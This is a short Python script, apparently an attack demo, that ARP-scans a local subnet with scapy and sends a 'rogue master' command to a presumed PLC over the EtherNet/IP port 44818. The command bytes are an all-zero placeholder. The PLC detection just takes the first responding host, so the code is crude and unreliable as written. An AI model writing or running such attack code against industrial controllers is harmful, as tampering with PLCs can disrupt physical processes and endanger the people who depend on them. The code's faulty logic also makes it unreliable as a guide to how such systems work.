import socket
from scapy.all import ARP, Ether, srp

def find_plc_ip():
    # Create an ARP request packet to scan the network
    arp = ARP(pdst="192.168.1.1/24")  # Adjust the IP range as needed
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    result = srp(packet, timeout=2, verbose=0)[0]

    # Parse the response to find the PLC
    plc_ip = None
    for sent, received in result:
        if received.psrc.startswith("192.168.1"):  # Adjust based on your network
            plc_ip = received.psrc
            print(f"PLC found at IP: {plc_ip}")
            break

    return plc_ip

def rogue_master_attack(plc_ip):
    # Create a socket to send rogue commands
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, 44818))  # EtherNet/IP uses port 44818

        # Send a rogue command (this is a simplified example)
        rogue_command = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"  # Placeholder for a control command
        sock.send(rogue_command)

        print(f"Rogue command sent to PLC at {plc_ip}")
    except Exception as e:
        print(f"Failed to send command: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        rogue_master_attack(plc_ip)
    else:
        print("PLC IP address not found.")